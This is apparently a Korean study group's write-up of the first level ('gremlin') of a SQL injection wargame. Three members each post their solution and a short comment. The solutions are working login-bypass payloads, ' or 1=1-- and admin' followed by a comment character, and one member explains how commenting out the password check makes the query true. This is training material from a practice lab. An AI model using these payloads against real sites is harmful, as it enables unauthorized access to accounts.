## 01.gremlin
<img src="/photo/prob_01.PNG" width="100%" height="100%" alt="problem"></img>

#### 5thofnovmbr
```
풀이: ?id=' or 1=1--%20
```
```diff
+ 주석 뒤에는 %20(스페이스)나 %09(탭)을 해주어야 한다.
- 자꾸 까먹는 내용이다.. 
```

#### TOR-s
```
풀이: ?id=admin%27%23
```
```diff
+ 쿼리를 알았다면 정말 쉽게 풀 수 있었을 것 같다.
```

#### zero526
```
풀이: ?id=admin%27--+
```
```diff
+ id테이블에 admin이라는 아이디가 존재한다는 가정하에 query문에 id=admin을 넣은 후 ' and pw='{$_GET[pw]}'";부분을 주석처리 해서 전체 query문을 참으로 만들어 해결했다 
```
